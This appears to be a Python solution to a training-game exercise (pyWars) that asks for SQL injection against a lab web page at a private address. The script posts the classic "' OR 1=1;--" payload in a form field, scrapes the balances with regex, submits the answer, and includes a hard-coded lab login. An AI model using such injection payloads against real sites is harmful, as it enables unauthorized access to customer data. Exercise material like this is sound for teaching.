'''
>>> game.question(13)

'POINTS:4,TIMED:N - Use SQL injection to determine the Office Location of the customer with the highest balance.
This is not times so it can be performed manually or you can use a tool you have written. Submit the string containing
the office location.  Obtain the target URL from the data element. '

>>> game.data(13)
'http://10.10.10.20/accts.php'

<td><font face="Arial, Helvetica, sans-serif">Hilliard City</font></td>
<td><font face="Arial, Helvetica, sans-serif">84045.00</font></td>


'''

import pyWars
import requests
import re
import io

game = pyWars.exercise()
game.login("mleigh","N0Passw0rd")

def answer(data):
    url = data
    sql = "bob' OR 1=1;--"
    myobjects = {"fname":sql, "lname":""}
    r = requests.post(url,data=myobjects)
    print(r.text)
    nums = map(float,re.findall(r'(\d+\.\d{2})',r.text))
    max_num = max(nums)
    print(max_num)
    office = re.findall(r'\D+>(\D+)</font\D+>'+ str(max_num),r.text)
    return office[0].encode()

        


print(game.answer(13,answer(game.data(13))))
game.logout
